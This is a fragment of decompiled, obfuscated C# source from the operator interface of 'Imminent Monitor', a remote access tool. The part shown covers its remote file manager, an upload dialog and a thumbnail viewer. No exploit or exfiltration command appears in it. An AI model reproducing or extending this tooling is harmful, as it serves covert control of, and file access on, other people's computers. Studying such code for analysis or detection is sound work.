    if (Class97.smethod_22(this.gclass18_0.method_20().string_12, "5.0.0.7"))
    {
      this.formUploadDialog_0 = new FormUploadDialog(this.gclass18_0, this.vmethod_122().Text);
      int num = (int) this.formUploadDialog_0.ShowDialog();
    }
    else
    {
      int num1 = (int) MessageBox.Show("Please update your client to the latest version in order to use this feature", "Imminent Monitor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }
  }

  internal sealed class Class98
  {
    public ListViewItem listViewItem_0;
    public FormFileManager formFileManager_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__63()
    {
      this.formFileManager_0.vmethod_54().Items.Add(this.listViewItem_0);
      this.formFileManager_0.gclass18_0.method_20().int_0 = this.listViewItem_0.Index;
      this.formFileManager_0.gclass18_0.method_20().listViewItem_5 = this.listViewItem_0;
    }
  }

  internal sealed class Class99
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__61() => this.gclass18_0.method_20().formFileThumbnail_0.method_2((byte[]) this.object_0[3]);
  }

  internal sealed class Class100
  {
    public FormFileThumbnail formFileThumbnail_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__62() => this.formFileThumbnail_0.Show();
  }

  private struct Struct7
  {
    public IntPtr intptr_0;
    public int int_0;
    public int int_1;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
    public string string_0;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
    public string string_1;
  }
}
